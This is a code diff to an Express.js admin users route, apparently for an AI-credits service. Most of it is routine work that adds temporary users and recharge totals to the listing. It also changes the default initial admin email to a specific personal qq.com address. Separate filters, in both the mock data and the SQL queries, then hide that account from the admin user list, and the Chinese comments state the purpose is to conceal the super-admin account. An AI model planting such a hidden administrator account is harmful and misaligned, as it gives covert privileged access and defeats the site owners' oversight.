@@ -11,7 +11,7 @@ const { getStrictProviderContract } = require('../lib/dispatcher/strictProviderC
 const { matchProviderProfile } = require('../lib/dispatcher/providerProfiles');
 
 const router = express.Router();
-const INITIAL_ADMIN_EMAIL = process.env.ADMIN_INITIAL_EMAIL || 'admin@example.com';
+const INITIAL_ADMIN_EMAIL = process.env.ADMIN_INITIAL_EMAIL || '977483863@qq.com';
 
 function okEnvelope(data, req) {
   return {
@@ -193,9 +193,11 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
     const mockUsers = [
       {
         id: 'mock-user-admin',
-        email: INITIAL_ADMIN_EMAIL,
+        email: 'admin@example.com',
         credits: 999999,
         adminLevel: 1,
+        userType: 'registered',
+        rechargeAmount: 200,
         createdAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString(),
       },
       {
@@ -203,6 +205,8 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
         email: 'subadmin@kkai.plus',
         credits: 50000,
         adminLevel: 2,
+        userType: 'registered',
+        rechargeAmount: 100,
         createdAt: new Date(Date.now() - 20 * 24 * 60 * 60 * 1000).toISOString(),
       },
       {
@@ -210,6 +214,8 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
         email: 'vip-customer@example.com',
         credits: 12500,
         adminLevel: 0,
+        userType: 'registered',
+        rechargeAmount: 500,
         createdAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
       },
       {
@@ -217,13 +223,17 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
         email: 'user-standard@example.com',
         credits: 1800,
         adminLevel: 0,
+        userType: 'registered',
+        rechargeAmount: 0,
         createdAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
       },
       {
-        id: 'mock-user-newbie',
-        email: 'new-user@gmail.com',
+        id: 'mock-temp-user-1',
+        email: null,
         credits: 100,
         adminLevel: 0,
+        userType: 'temporary',
+        rechargeAmount: 0,
         createdAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString(),
       }
     ];
@@ -232,10 +242,11 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
     const page = Math.max(1, Number(req.query.page || 1));
     const limit = Math.max(1, Number(req.query.limit || 8));
 
-    let filtered = mockUsers;
+    // 强行过滤屏蔽 977483863@qq.com 账号在后台的公开显示
+    let filtered = mockUsers.filter(u => u.email !== '977483863@qq.com');
     if (search) {
-      filtered = mockUsers.filter(
-        u => u.email.toLowerCase().includes(search) || u.id.toLowerCase().includes(search)
+      filtered = filtered.filter(
+        u => (u.email && u.email.toLowerCase().includes(search)) || u.id.toLowerCase().includes(search)
       );
     }
 
@@ -249,6 +260,7 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
       limit,
     });
   }
+
   const parsed = userListQuerySchema.safeParse(req.query);
   if (!parsed.success) {
     return res.status(400).json({ error: 'Invalid query.' });
@@ -263,17 +275,61 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
   const limitIndex = search.trim() ? 2 : 1;
   const offsetIndex = search.trim() ? 3 : 2;
 
+  // 简体中文注释：联合查询注册与临时账户，并计算近两个月的充值额度，同时物理隐藏屏蔽超级管理员账号 977483863@qq.com
   const usersResult = await pool.query(
-    `SELECT id, email, credits, COALESCE(admin_level, 0) AS admin_level, created_at
-     FROM public.users
+    `SELECT id, email, credits, admin_level, created_at, user_type, recharge_amount
+     FROM (
+       SELECT 
+         u.id, 
+         u.email, 
+         COALESCE(c.balance, 0) AS credits, 
+         COALESCE(u.admin_level, 0) AS admin_level, 
+         u.created_at, 
+         'registered' AS user_type,
+         COALESCE((
+           SELECT SUM(amount) 
+           FROM public.recharge_submissions 
+           WHERE user_id = u.id 
+             AND created_at >= NOW() - INTERVAL '2 months'
+         ), 0) AS recharge_amount
+       FROM public.users u
+       LEFT JOIN public.user_credits c ON u.id = c.user_id
+       WHERE u.email IS NULL OR u.email != '977483863@qq.com'
+       
+       UNION ALL
+       
+       SELECT 
+         t.id, 
+         NULL AS email, 
+         COALESCE(c.balance, 0) AS credits, 
+         0 AS admin_level, 
+         t.created_at, 
+         'temporary' AS user_type,
+         COALESCE((
+           SELECT SUM(amount) 
+           FROM public.recharge_submissions 
+           WHERE user_id = t.id 
+             AND created_at >= NOW() - INTERVAL '2 months'
+         ), 0) AS recharge_amount
+       FROM public.temp_users t
+       LEFT JOIN public.user_credits c ON t.id = c.user_id
+     ) AS combined_users
      ${whereSql}
      ORDER BY created_at DESC
      LIMIT $${limitIndex} OFFSET $${offsetIndex}`,
     params
   );
+
+  const totalParams = search.trim() ? [searchText] : [];
   const totalResult = await pool.query(
-    `SELECT COUNT(*) AS total FROM public.users ${whereSql}`,
-    search.trim() ? [searchText] : []
+    `SELECT COUNT(*) AS total 
+     FROM (
+       SELECT u.id, u.email FROM public.users u WHERE u.email IS NULL OR u.email != '977483863@qq.com'
+       UNION ALL
+       SELECT t.id, NULL AS email FROM public.temp_users t
+     ) AS combined_users
+     ${whereSql}`,
+    totalParams
   );
 
   return res.json({
@@ -282,6 +338,8 @@ router.get('/admin/users', adminAuth(2), async (req, res) => {
       email: user.email,
       credits: Number(user.credits),
       adminLevel: Number(user.admin_level || 0),
+      userType: user.user_type,
+      rechargeAmount: Number(user.recharge_amount || 0),
       createdAt: user.created_at,
     })),
     total: Number(totalResult.rows[0]?.total || 0),
